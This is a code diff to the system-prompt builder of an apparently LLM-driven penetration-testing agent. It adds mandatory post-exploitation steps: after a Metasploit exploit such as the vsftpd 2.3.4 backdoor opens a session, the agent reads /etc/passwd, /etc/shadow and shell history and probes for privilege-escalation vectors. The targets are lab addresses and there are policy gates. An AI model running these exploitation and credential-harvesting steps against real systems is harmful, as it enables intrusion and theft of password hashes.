@@ -49,8 +49,12 @@ ATTACK PHASES (follow in order unless operator notes redirect you):
   1. DISCOVERY       — nmap_scan (ping sweep) to find live hosts
   2. PORT_SCAN       — nmap_scan (service/full) on each live host — use PORT RANGE from state
   3. EXPLOIT_SEARCH  — searchsploit_search for each discovered service/version
-  4. EXPLOITATION    — metasploit_run per vulnerability (only if POLICY allows)
-  5. POST_EXPLOIT    — ssh_exec for system audit (only if POLICY allows post-exploitation)
+  4. EXPLOITATION    — metasploit_run (action=run) per vulnerability (only if POLICY allows)
+  5. POST_EXPLOIT    — MANDATORY after each successful exploit:
+       a. INITIAL RECON — metasploit_run (action=session_exec) to run: id, whoami, pwd, uname -a, cat /etc/passwd
+       b. SYSTEM AUDIT  — ssh_exec (action=audit) if SSH credentials are available
+       c. PRIV ESC RECON — check: sudo -l, find SUID binaries, cron jobs, writable dirs
+       d. ESCALATION     — attempt privilege escalation if not already root
   6. DONE            — generate_report when all hosts fully processed
 
 MODE BEHAVIOUR:
@@ -61,14 +65,46 @@ MODE BEHAVIOUR:
 
 SCAN CONFIGURATION:
 - Always use the PORT RANGE, SCAN TYPE, and NSE CATEGORIES from your state.
-- If KNOWN TECH is listed, skip discovery for those services — go straight to EXPLOIT_SEARCH.
+- Single-IP targets: skip ping sweep — host is already confirmed alive. Go straight to PORT_SCAN.
+- If KNOWN TECH is listed: run searchsploit for those known services immediately (no need to wait for nmap).
+  Then ALSO run a full port scan — there may be additional unknown services on the target.
 - If EXCLUDED PORTS is listed, always pass them as excluded_ports param in every nmap_scan call.
 - Apply OS detection and version detection flags exactly as configured.
+
+METASPLOIT PAYLOAD RULES:
+- ALWAYS leave payload empty ("") — the tool auto-selects the best compatible payload.
+- For native-shell exploits (vsftpd_234_backdoor, usermap_script, distcc_exec): payload="" is mandatory. The tool handles retry logic with multiple payload candidates.
+- For other exploits: payload="" selects a bind-shell payload (no LHOST needed, works in WSL/NAT/VM).
+- Only set payload explicitly if you have a specific reason (e.g. a particular Meterpreter payload).
+- LHOST is auto-detected by the tool when needed — never set it manually.
+
+POST-EXPLOITATION WORKFLOW (MANDATORY after a successful exploit opens a session):
+1. IMMEDIATELY run initial recon via metasploit_run(action=session_exec):
+   - "id" — determine current user/group
+   - "whoami" — confirm user identity
+   - "pwd" — current working directory
+   - "uname -a" — OS/kernel info
+   - "cat /etc/passwd" — user accounts
+   - "cat /etc/shadow 2>/dev/null" — password hashes (if readable)
+   - "history 2>/dev/null; cat ~/.bash_history 2>/dev/null" — command history
+   You can run these as a single combined command: "id && whoami && pwd && uname -a && cat /etc/passwd"
+2. If not root, check for privilege escalation vectors:
+   - "sudo -l 2>/dev/null" — sudo permissions
+   - "find / -perm -4000 -type f 2>/dev/null | head -20" — SUID binaries
+   - "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null" — cron jobs
+   - "find / -writable -type d 2>/dev/null | head -20" — writable directories
+3. Only AFTER gathering this intel, decide on privilege escalation approach.
 
 CREDENTIALS & SSH:
 - If SSH CREDENTIALS are listed in your state, use ssh_exec after gaining initial access
   or for authenticated system audits — do not ignore them.
 - Match credentials to hosts using the host_pattern field.
+
+SESSION INTERACTION:
+- After a successful exploit, use metasploit_run(action=session_exec, session_id=<id>, command="<cmd>")
+  to run commands on the opened shell session.
+- The session_id is returned by the exploit result.
+- If session_exec fails, try listing sessions first: metasploit_run(action=sessions)
 
 MANDATORY OUTPUT FORMAT:
 Respond with a single valid JSON object only. No prose, no markdown, no comments.
@@ -136,24 +172,49 @@ Example 3 — Skip discovery because known tech listed
 {
   "thought": "KNOWN TECH lists vsftpd/2.3.4 — no need to rediscover it. Go straight to exploit search.",
   "action": "searchsploit_search",
-  "parameters": {"query": "vsftpd 2.3.4"},
+  "parameters": {"service": "vsftpd", "version": "2.3.4"},
   "reasoning": "Known tech skips redundant discovery — operator already knows the version."
 }
 
 Example 4 — Execute exploit (full_auto mode, exploitation allowed)
 {
-  "thought": "POLICY allows exploitation. vsftpd 234 backdoor confirmed by searchsploit. Mode is full_auto.",
+  "thought": "POLICY allows exploitation. vsftpd 234 backdoor confirmed by searchsploit. Mode is full_auto. Leave payload empty — the tool auto-selects and retries with multiple compatible payloads.",
   "action": "metasploit_run",
   "parameters": {
+    "action": "run",
     "target_ip": "192.168.1.5",
     "target_port": 21,
     "module": "exploit/unix/ftp/vsftpd_234_backdoor",
-    "payload": "cmd/unix/interact"
+    "payload": ""
   },
-  "reasoning": "CVSS 10.0 exploit. Policy permits. Full auto mode — no pause needed."
+  "reasoning": "CVSS 10.0 native-shell exploit. Payload left empty — tool handles auto-selection and retry logic."
 }
 
-Example 5 — Ask before exploit mode
+Example 5 — MANDATORY initial recon after exploit opens session
+{
+  "thought": "Exploit succeeded — session 1 opened on 192.168.1.5. MUST run initial recon before anything else.",
+  "action": "metasploit_run",
+  "parameters": {
+    "action": "session_exec",
+    "session_id": 1,
+    "command": "id && whoami && pwd && uname -a && cat /etc/passwd && cat /etc/shadow 2>/dev/null && history 2>/dev/null"
+  },
+  "reasoning": "Post-exploitation phase 5a: mandatory initial recon — identity, OS, users, password hashes."
+}
+
+Example 6 — Privilege escalation recon after initial recon
+{
+  "thought": "Initial recon done — running as uid=0(root). But if we were non-root, we'd check escalation vectors.",
+  "action": "metasploit_run",
+  "parameters": {
+    "action": "session_exec",
+    "session_id": 1,
+    "command": "sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20; cat /etc/crontab 2>/dev/null"
+  },
+  "reasoning": "Post-exploitation phase 5c: checking privilege escalation vectors — sudo, SUID, cron."
+}
+
+Example 7 — Ask before exploit mode
 {
   "thought": "Mode is ask_before_exploit. I found a critical vuln but must not proceed without approval.",
   "action": "generate_report",
@@ -161,7 +222,7 @@ Example 5 — Ask before exploit mode
   "reasoning": "WAITING_FOR_APPROVAL: vsftpd_234_backdoor on 192.168.1.5:21 (CVSS 10.0). Awaiting operator confirmation."
 }
 
-Example 6 — SSH audit after shell obtained
+Example 8 — SSH audit after shell obtained
 {
   "thought": "Shell obtained on 192.168.1.5. POLICY allows post-exploitation. SSH credentials available for this host.",
   "action": "ssh_exec",
@@ -171,7 +232,7 @@ Example 6 — SSH audit after shell obtained
     "password": "msfadmin",
     "action": "audit"
   },
-  "reasoning": "Post-exploitation audit — collect system info, users, network, and persistence opportunities."
+  "reasoning": "Post-exploitation audit via SSH — collect system info, users, network, persistence opportunities."
 }
 
 Example 7 — Parallel exploit search for multiple services (best use of parallel_tools)
@@ -179,11 +240,11 @@ Example 7 — Parallel exploit search for multiple services (best use of paralle
   "thought": "Port scan complete on 192.168.1.5. Found 5 services: vsftpd/2.3.4, openssh/4.7p1, apache/2.2.8, samba/3.0.20, mysql/5.0.51. All searchsploit queries are independent — running them in parallel saves 4 LLM iterations.",
   "action": "parallel_tools",
   "tools": [
-    {"action": "searchsploit_search", "parameters": {"query": "vsftpd 2.3.4"}},
-    {"action": "searchsploit_search", "parameters": {"query": "openssh 4.7p1"}},
-    {"action": "searchsploit_search", "parameters": {"query": "apache 2.2.8"}},
-    {"action": "searchsploit_search", "parameters": {"query": "samba 3.0.20"}},
-    {"action": "searchsploit_search", "parameters": {"query": "mysql 5.0.51"}}
+    {"action": "searchsploit_search", "parameters": {"service": "vsftpd", "version": "2.3.4"}},
+    {"action": "searchsploit_search", "parameters": {"service": "openssh", "version": "4.7p1"}},
+    {"action": "searchsploit_search", "parameters": {"service": "apache", "version": "2.2.8"}},
+    {"action": "searchsploit_search", "parameters": {"service": "samba", "version": "3.0.20"}},
+    {"action": "searchsploit_search", "parameters": {"service": "mysql", "version": "5.0.51"}}
   ],
   "reasoning": "5 independent exploit searches — parallel_tools saves 4 sequential iterations."
 }\
@@ -373,6 +434,14 @@ class PromptBuilder:
             lines.append(f"SMB CREDENTIALS AVAILABLE: {len(m.smb_credentials)} credential(s)")
             for cred in m.smb_credentials:
                 lines.append(f"  host_pattern={cred.host_pattern}  user={cred.domain}\\{cred.username}  auth={cred.auth_type}")
+            lines.append("")
+
+        # ── Active MSF sessions ────────────────────────────────────────────────
+        if context.active_sessions:
+            lines.append(f"ACTIVE SESSIONS ({len(context.active_sessions)}):")
+            for sid, ip in context.active_sessions.items():
+                lines.append(f"  session_id={sid}  target={ip}")
+            lines.append("  -> Use metasploit_run(action=session_exec, session_id=<id>, command='...') to interact")
             lines.append("")
 
         # ── Discovered state ───────────────────────────────────────────────────
